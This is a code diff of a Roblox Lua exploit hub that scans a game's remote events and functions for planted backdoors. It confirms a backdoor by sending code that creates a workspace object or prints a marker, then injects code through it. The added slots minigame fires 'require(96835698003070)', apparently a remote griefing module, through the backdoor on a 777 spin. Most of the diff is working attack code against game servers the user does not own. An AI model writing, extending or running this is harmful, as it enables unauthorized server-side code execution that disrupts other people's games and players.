@@ -74,7 +74,6 @@ local playerstring = add(game.Players.LocalPlayer.Name,'"')
 
 -- script list
 local buttons_injectors = {
-	c00llerchee = "require(96835698003070)",
 	nosoi = "local nosoi = require(112136724593392) \n nosoi.init(game.Players.".. game.Players.LocalPlayer.Name ..".Character.HumanoidRootPart.Position+Vector3.new(0,38.5,0))",
 	ForsakenFanLercheCharacter = "require(75430638106726).new(".. playerstring ..")",
 }
@@ -720,7 +719,7 @@ local function music_creator()
 end
 
 -- SS executor creator
-local function gui_create()
+local function gui_create()	
 	if r==nil then
 		create("Error!","Remote not found, try to find again!")
 		return
@@ -977,9 +976,7 @@ local function find()
 	task.wait(2)
 	if foundas==false then
 		create("Not found c00lspawnn's backdoor remote", "finding LALOL hub's backdoor remote. ".. os.clock()- timee.."s")
-
 		local remotes={}
-
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			while true do
@@ -989,68 +986,43 @@ local function find()
 			spawn(function() protected_backdoor:InvokeServer('idk,,,', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 			remotes[code]=protected_backdoor
 		end
-
 		for i,remote in game:GetDescendants() do
-
-			-- Validation Checker
-
 			if not remote:IsA('RemoteEvent') then 
 				if not remote:IsA('RemoteFunction') then continue end
 			end
-
-			-- RobloxReplicatedStorage
 			if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
-				--		debug('Roblox Replicated Storage ('..remote.Name..')', 1)
 				continue
 			end
 
 			if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
 				if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
-					--	debug('Adonis filter detected ('..remote.Name..')', 1)
 					continue
 				end
 
 				if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
-					--		debug('HD Admin ('..remote.Name..')', 1)
 					continue
 				end
 				if remote.Parent.Name=='DefaultChatSystemChatEvents' then
-					--		debug('Chat event ('..remote.Name..')', 1)
 					continue
 				end
 			end
-
-			-- Backdoor Sender
-
 			while true do
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-
 			runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
 			remotes[code]=remote
-
 		end
-
-		-- Backdoor Checker
-
 		for i=1,100 do
-
 			for i,remote in remotes do
 				local code=i
-
 				if workspace:FindFirstChild(code) then
-
-
 					r=remote
 					create("Found!", "Found LALOL's hub backdoor remote in "..os.clock()-timee.."s")
 					return true
 				end
-				--				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
 			end
-
-			wait()--.1)
-
+			task.wait()
 		end
 
 		check2 = false
@@ -1058,18 +1030,18 @@ local function find()
 	task.wait(2)
 	if check2 == false then
 		create("Not Found LALOL's hub backdoor remote.", "Searching for custom backdoors remote.")
-		remotes = remotes or getRemotes();
+		local remotes_sigma = getRemotes()
 
-		for i, rem in ipairs(remotes) do
+		for i, rem in ipairs(remotes_sigma) do
 			if check2 == true then break end;
 			if rem:IsA("RemoteEvent") then
-				rem:FireServer("print('HelloFRSSSBACKDOOR')")
+				rem:FireServer("print('hellbckdr')")
 			elseif rem:IsA("RemoteFunction") then
-				rem:InvokeServer("print('HelloFRSSSBACKDOOR!')")
+				rem:InvokeServer("print('hellbckdr!')")
 			end
 
 			game.LogService.MessageOut:Connect(function(msg)
-				if msg:lower():find('HelloFRSSSBACKDOOR!') then
+				if msg:lower():find('hellbckdr') then
 					create("Backdoor found!", "Backdoor is in control of your game.")
 					check2 = true
 					r = rem
@@ -1081,6 +1053,8 @@ local function find()
 		
 		return false
 	end
+	
+	return false
 end
 
 -- its obvious
@@ -1105,10 +1079,328 @@ local function setclipboardfunc(str : string)
 	create("Clipboard","Copy clipboard has been used")
 end
 
+function typewrite(TextLabel,text, waiter)
+	for i = 1,#text do
+		TextLabel.Text = string.sub(text,1,i)
+		task.wait(waiter)
+	end
+end
+
+-- GAMBLING!
+local function gambler()
+	local create_guigamble = Instance.new("ScreenGui",interface)
+	create_guigamble.ResetOnSpawn = false
+	create_guigamble.IgnoreGuiInset = true
+
+	local frame = frame_template(create_guigamble)
+	frame.ClipsDescendants = true
+
+	local value1, value2, value3
+	local activatorbool = Instance.new("BoolValue")
+	value1 = Instance.new("StringValue")
+	value2 = Instance.new("StringValue")
+	value3 = Instance.new("StringValue")
+
+	local connectors = {}
+
+	local function createslot(pos,activator:BoolValue,value,long)
+		task.spawn(function()
+			local gambleframe = Instance.new("Frame",frame)
+			gambleframe.Size = UDim2.new(0.35,0,0.35,0)
+			gambleframe.ClipsDescendants = true
+			gambleframe.AnchorPoint = Vector2.new(0.5,0.5)
+			gambleframe.Position = UDim2.new(pos,0,0.5,0)	
+
+			local test = Instance.new("TextLabel",gambleframe)
+			test.BackgroundTransparency = .35
+			test.Size = UDim2.new(.5,0,.5,0)
+			test.Position = UDim2.new(0.5,0,0,0)
+			test.Text = "1"
+			test.AnchorPoint = Vector2.new(0.5,0.5)	
+			test.TextScaled = true
+			local middleline = Instance.new("Frame",gambleframe)
+			middleline.Size = UDim2.new(1,0,0.35,0)
+			middleline.AnchorPoint = Vector2.new(0.5,0.5)
+			middleline.Position = UDim2.new(0.5,0,0.5,0)
+			middleline.BackgroundColor3 = Color3.new(0, 0, 0)
+			middleline.BackgroundTransparency = 0.85
+			middleline.BorderSizePixel = 0
+			middleline.ZIndex = 1
+
+
+
+			local nums = {
+				2,3,4,5,6,7,1
+			}
+
+			local num2down = {
+				1,7,6,5,4,3,2
+			}
+
+			local cur = test
+			for i,v in pairs(nums) do
+				local test2 = cur:Clone()
+				test2.Parent = cur
+				test2.Text = v
+				test2.Size = UDim2.new(1,0,1,0)
+				test2.Position = UDim2.new(0.5,0,-0.5,0)
+				test2:ClearAllChildren()
+				cur = test2
+			end
+
+			local cur2 = test
+
+			local e = 1.5
+			local elist = {}
+			local stufflist = {}
+			for i,v in pairs(nums) do
+				local test2 = cur2:Clone()
+				test2.Parent = cur2
+				test2.Text = v
+				test2.Size = UDim2.new(1,0,1,0)
+				test2.Position = UDim2.new(0.5,0,1.5,0)
+				e += 1.5
+				test2:ClearAllChildren()
+				cur2 = test2
+
+				table.insert(stufflist,test2)
+			end
+
+			local getrandom_1 = math.random(1,7)
+			local a = "0."..getrandom_1
+
+
+			local auh = {
+				[1] = -0.5,
+				[2] = 0,
+				[3] = 0.5,
+				[4] = 1,
+				[5] = 1.5,
+				[6] = 2,
+				[7] = 2.5,
+			}
+
+			local current = 2
+			if getrandom_1==current then
+				repeat
+					getrandom_1 = math.random(1,7)
+				until getrandom_1~=current
+			end
+			current = getrandom_1
+
+			--game.TweenService:Create(test,TweenInfo.new(3),{Position = UDim2.new(0.5,0,-auh[getrandom_1],0)}):Play()
+
+			if value then
+				value.Value = current
+				print(current)
+			end
+
+			task.wait(1)
+
+			activator.Changed:Connect(function()
+				if getrandom_1==current then
+					repeat
+						getrandom_1 = math.random(1,7)
+					until getrandom_1~=current
+				end
+				current = getrandom_1
+				if value then
+					value.Value = current
+					print(current)
+				end
+				--	print(current)
+				--	print(auh[current])
+				game.TweenService:Create(test,TweenInfo.new(long),{Position = UDim2.new(0.5,0,-auh[current],0)}):Play()
+			end)
+
+		end)
+	end
+	closebutton(frame,create_guigamble,function()
+		create("oh", "no more gambling???????????????? sadness")
+	end)
+	createslot(0.15,activatorbool,value1,1)
+	createslot(0.5,activatorbool,value2,2)
+	createslot(0.85,activatorbool,value3,3)
+
+	local button = Instance.new("TextButton",frame)
+	button.Size = UDim2.new(0.5,0,0.15,0)
+	button.BackgroundColor3 = Color3.new(0.729412, 0.729412, 0.729412)
+	button.BackgroundTransparency = 0.25
+	button.Text = "Spin"
+	button.TextScaled = true
+	button.AnchorPoint = Vector2.new(0.5,0.5)
+	button.Position = UDim2.new(0.5,0,0.85,0)
+
+	local title = Instance.new("TextLabel",frame)
+	title.Size = UDim2.new(1,0,0.1,0)
+	title.Position = UDim2.new(0.5,0,0.1,0)
+	title.TextScaled = true
+	title.TextColor3 = Color3.fromRGB(39, 244, 255)
+	title.BackgroundTransparency = 1
+	title.Text = "CLIENT SIDE"
+	title.AnchorPoint = Vector2.new(0.5,0.5)
+	local con 
+	con = game["Run Service"].RenderStepped:Connect(function()
+		local evil = false
+		if r then
+			title.TextColor3 = Color3.fromRGB(75, 255, 62)
+			evil = true
+			title.Text = "SERVER SIDE"
+			con:Disconnect()
+		end
+	end)
+
+	local b = Instance.new("TextLabel",frame)
+	b.Size = UDim2.new(1,0,0.1,0)
+	b.Position = UDim2.new(0.5,0,0.25,0)
+	b.TextScaled = true
+	b.TextColor3 = Color3.fromRGB(255, 255, 255)
+	b.BackgroundTransparency = 1
+	b.Text = "3   3   3"
+	b.AnchorPoint = Vector2.new(0.5,0.5)
+	b.TextTransparency = 1
+	b.RichText = true
+	local delayer = false
+	
+	local bindable = Instance.new("BindableFunction")
+	
+	bindable.OnInvoke = function()
+		if r then
+			button:Destroy()
+			local title = Instance.new("TextLabel",frame)
+			title.Size = UDim2.new(1,0,0.1,0)
+			title.Position = UDim2.new(0.5,0,0.85,0)
+			title.TextScaled = true
+			title.TextColor3 = Color3.fromRGB(255, 255, 255)
+			title.BackgroundTransparency = 0
+			title.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
+			title.Text = ""
+			title.RichText = true
+			title.TextScaled = true
+			title.AnchorPoint = Vector2.new(0.5,0.5)
+			local h = Instance.new("TextLabel",title)
+			h.Size = UDim2.new(1,0,1,0)
+			h.BackgroundTransparency = 1
+			h.TextColor3 = Color3.fromRGB(255,255,255)
+			h.RichText = true
+			h.TextScaled = true
+			title.Changed:Connect(function()
+				h.Text = run(title.Text)
+			end)
+
+			typewrite(title, "require(96835698003070)",0.01)
+			task.wait(0.05)
+			create("funny", "running ...")
+			task.wait(1)
+
+			if r then
+				if r:IsA("RemoteEvent") then
+					r:FireServer("require(96835698003070)")
+				elseif r:IsA("RemoteFunction") then
+					r:InvokeServer("require(96835698003070)")
+				end
+			end
+		else
+			create("Hakari reference", "for the next eternity of this planet, "..game.Players.LocalPlayer.DisplayName.." is now immortal")
+		end
+	end
+	
+	button.MouseButton1Click:Connect(function()
+		if delayer==true then return end
+		activatorbool.Value = not activatorbool.Value
+		delayer = true
+		task.delay(3,function()
+			delayer = false
+			TweenService:Create(b,TweenInfo.new(1),{TextTransparency = 0}):Play()
+			b.Text = tostring(value1.Value).. "   ".. tostring(value2.Value).. "   ".. tostring(value3.Value)
+			
+			b.Text=b.Text:gsub("7",'<font color="#3CAE63">7</font>')
+			
+			task.delay(0.5,function()
+				TweenService:Create(b,TweenInfo.new(1),{TextTransparency = 1}):Play()
+			end)
+			
+			if value1.Value=="7" and value2.Value=="7" and value3.Value=="7" then
+				bindable:Invoke()
+			end
+		end)
+	end)
+end
+
+-- yeah bro
+local function createclientsidehub()
+	-- FARTS VERY LOUDLY SO I DONT KNOW
+
+	local plrGui_ = Instance.new("ScreenGui",interface)
+	plrGui_.ResetOnSpawn = false
+	plrGui_.IgnoreGuiInset = true
+	plrGui_.Name = "farting few"
+
+	local frame = Instance.new("Frame",plrGui_)
+	frame.Size = UDim2.new(0.1,0,0.25,0)
+	frame.BackgroundColor3 = Color3.fromRGB(45,45,45)
+	frame.Position = UDim2.new(0.5,0,0.5,0)
+	frame.AnchorPoint = Vector2.new(0.5,0.5)
+	frame.Active = true
+	frame.Draggable = true
+	frame.Name = "Skibbity"
+
+	frame.ClipsDescendants=false
+
+	local imagelabel = Instance.new("ImageLabel",frame)
+	imagelabel.Size = UDim2.new(1,0,1,0)
+	imagelabel.BackgroundTransparency = 1
+	imagelabel.Image = "rbxassetid://74595603256262"
+	imagelabel.ImageColor3 = Color3.fromRGB(255,255,255)
+	imagelabel.AnchorPoint = Vector2.new(0.5,0.5)
+	imagelabel.Position = UDim2.new(0.5,0,0.5,0)
+	imagelabel.ScaleType = Enum.ScaleType.Fit
+	imagelabel.ImageTransparency = 0.75
+
+	game["Run Service"].RenderStepped:Connect(function(d)
+		imagelabel.Rotation += 0.15
+	end)
+
+	local buttons = {"Music player", "Slots"}
+
+	local scrollingframe = Instance.new("ScrollingFrame",frame)
+	scrollingframe.Size = UDim2.new(1,0,1,0)
+	scrollingframe.BackgroundTransparency = 1
+	scrollingframe.CanvasSize = UDim2.new(0,0,0,0)
+	scrollingframe.ScrollBarThickness = 2
+	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
+
+
+	for i,v in pairs(buttons) do
+		local temp = Instance.new("TextButton",scrollingframe)
+		temp.Size = UDim2.new(1,0,0.025,0)
+		temp.BackgroundColor3 = Color3.fromRGB(55,55,55)
+		temp.TextColor3 = Color3.fromRGB(255,255,255)
+		temp.TextTransparency = 0.65
+		temp.TextXAlignment = Enum.TextXAlignment.Left
+		temp.TextYAlignment = Enum.TextYAlignment.Top
+		temp.Text = v
+		temp.TextSize = 20
+		temp.TextWrapped = true
+		temp.AutomaticSize = Enum.AutomaticSize.Y
+		temp.MouseButton1Click:Connect(function()
+			if temp.Text == "Music player" then
+				music_creator()
+			else
+				gambler()
+			end
+		end)
+	end
+	
+	local uilist = 	Instance.new("UIListLayout",scrollingframe)
+	uilist.Padding = UDim.new(0,3)
+	scrollingframe.CanvasSize = UDim2.new(0,0,0,scrollingframe.UIListLayout.AbsoluteContentSize.Y)
+end
+
 local bindable = Instance.new("BindableFunction")
 bindable.OnInvoke = function(option)
-	if option == "Music Player" then
-		music_creator()
+	if option == "Ok!yes" then
+		createclientsidehub()
 	end
 end
 
@@ -1120,18 +1412,23 @@ local function createHandler()
 	create("Finding backdoor", "yeah wait a bit")
 
 	task.wait(0.05)
-
+	local breakwait = false
 	local is_found = find()
 	if is_found==false then
 		task.wait(1)		
-		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n What you wanna open?",5,"Music Player","",bindable)
+		breakwait = true
+		create_withoptions("No Found", "Sorry! This place is not have backdoor. Sorry! \n (CLIENT SIDE) \n wanna open hub?",5,"Ok!yes","No!!!1",bindable)
 		return
 	end
+	
 
 	repeat
 		task.wait()
+		if breakwait==true then
+			is_found=true
+		end
 	until is_found==true
-
+	if breakwait==true then return end
 	create("Found it!", "Thanks for waiting! Backdoor name in case: '".. r.Name.."'")
 
 	local verified = false
@@ -1268,7 +1565,7 @@ local function createHandler()
 	scrollingframe.ScrollBarThickness = 2
 	scrollingframe.ScrollBarImageColor3 = Color3.fromRGB(255,255,255)
 
-	local buttons = {"Inject","Reset","Music player"}
+	local buttons = {"Inject","Reset","Music player", "Slots"}
 
 	for i,v in pairs(buttons) do
 		local temp = Instance.new("TextButton",scrollingframe)
@@ -1290,6 +1587,8 @@ local function createHandler()
 				gui_create()
 			elseif temp.Text == "Music player" then
 				music_creator()
+			else
+				gambler()
 			end
 		end)
 	end
